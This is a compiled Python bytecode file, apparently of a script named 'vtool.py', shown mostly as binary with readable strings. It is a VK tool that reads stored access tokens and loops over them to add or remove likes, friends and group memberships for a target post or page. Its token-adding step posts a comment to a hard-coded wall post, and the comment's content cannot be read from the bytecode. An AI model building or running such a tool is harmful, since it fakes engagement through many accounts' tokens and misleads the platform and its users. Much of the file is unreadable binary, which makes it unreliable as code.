U
    eAm^m  �                   @   s�  d dl Z d dlZe �d� edd�Ze��  edd�Zdd� Zdd	� Zd
d� Zdd� Z	dd� Z
dd� Zed� dZe�s|dZed� ed�Zedkr�e�  qredkr�e�  qredkr�ed� ed�Zedkr�e	�  nedkr�e
�  ndZed� qredk�rned�ZzRejed�Zejedd d!�Zejjd"d#ed$� edd%�Ze�ed& � e��  W n   ed'� Y nX qrdZed� qred(� e��  dS ))�    N�clearz.tokensza+�rc                  C   sH   t �� } | d t| �d � } | dkr(dS tj| d�}tj|ddd�S d S )N�   � T�Zaccess_token�5.92�ru��vZlang)�f�readline�len�vk�Session�API)�token�session� r   �vtool.py�login   s    r   c                  C   s�   d} d}d}t � }td�}td� | t|�k r�t� }|d7 }|dkrP|d8 }q�n
|dkrZq"zB|jjt|d �t|d �|d d� | d7 } |d7 }td	� W q"   � td
� Y q"X q"tdt|� d t|| � � d S �Nr   �[35mEnter the quantity: [0mr   r   TF�   )�owner_idZitem_id�type�[32m Successful�[31m Error�#
[35mResults:[32m    Successful: �[31m    Failed: )�getlink�input�print�intr   �likes�add�str�Zlap�allZsuccZparamsZquantity�apir   r   r   r#      s.    &r#   c                  C   s\  d} d}d}t � }td�}td� |d dkr�| t|�k r�t� }|d7 }|dkr\|d8 }q�n
|dkrfq.z2|jjt|d �d� | d7 } |d7 }td	� W q.   td
� Y q.X q.n�| t|�k �r8t� }|d7 }|dkr�|d8 }�q8n
|dkr�q�z2|jjt|d �d� | d7 } |d7 }td	� W q�   td
� Y q�X q�tdt	|� d t	|| � � d S �Nr   r   r   �idr   TF)Zuser_idr   r   )Zgroup_idr   r   )
r   r    r!   r"   r   �friendsr$   �groups�joinr%   r&   r   r   r   �	followers(   sL    r.   c                  C   s�   d} d}d}t � }td�}td� | t|�k r�t� }|d7 }|dkrP|d8 }q�n
|dkrZq"zB|jjt|d �t|d �|d d� | d7 } |d7 }td	� W q"   td
� Y q"X q"tdt|� d t|| � � d S r   )r   r    r!   r"   r   r#   �deleter%   r&   r   r   r   �unlikesP   s,    &r0   c                  C   s\  d} d}d}t � }td�}td� |d dkr�| t|�k r�t� }|d7 }|dkr\|d8 }q�n
|dkrfq.z2|jjt|d �d� | d7 } |d7 }td	� W q.   td
� Y q.X q.n�| t|�k �r8t� }|d7 }|dkr�|d8 }�q8n
|dkr�q�z2|jjt|d �d� | d7 } |d7 }td	� W q�   td
� Y q�X q�tdt	|� d t	|| � � d S r)   )
r   r    r!   r"   r   r+   r/   r,   Zleaver%   r&   r   r   r   �unfollowersg   sL    r1   c                  C   s  d} d}d}d}d}t d�}tt|��D ]�}|| dkr@|d } || k rJq(|dkr�| dkr�z4|| dkrp|d7 }t|| � d}||| 7 }W q�   ||| 7 }Y q�X q(|dkr�|| dkr�||| 7 }q�d	}q(|d	kr(||| 7 }q(|d d
kr�d}|||fS )Nr   r   z[35mEnter the link: [0m�.�   �-r   �_r   �wZpost)r    �ranger   r"   )Zspace�stepr   ZfirstIDZsecondIDZlink�charr   r   r   r   �   s<    r   u�  [37m
 InvertedOnes         Vk: @inverted_ones[32m
 ┏━━┳━━┳━━┳━━┓  ┏━━━━━┳━━━━━┳━━━━━┳━┓
 ┃  ┃  ┃    ┏┛  ┗━┓ ┏━┫  ┓  ┃  ┓  ┃ ┃
 ┗┓   ┏┫    ┗┓    ┃ ┃ ┃  ┗  ┃  ┗  ┃ ┗━━┓
  ┗━━━┛┗━━┻━━┛    ┗━┛ ┗━━━━━┻━━━━━┻━━━━┛
FTzf[35m[1][0m Add likes [35m
[2][0m Add followers [35m
[3][0m Other [35m

[4][0m Add token [35m
z&Please, enter your task's number: [0m�1�2�3z@[35m
[1][0m Delete likes [35m
[2][0m Delete followers [35m
z[31mEnter right number
�4z[35mEnter the token: [0mr   r   r   r	   i
��r   )r   Zpost_id�message�a�
z
[31mInvalid tokenr   )�osr   �system�openr   �closer   r#   r.   r0   r1   r   r!   Zdoner    ZtaskZtkr   r   r   r(   ZwallZcreateCommentr6   �writer   r   r   r   �<module>   sX   


(( 



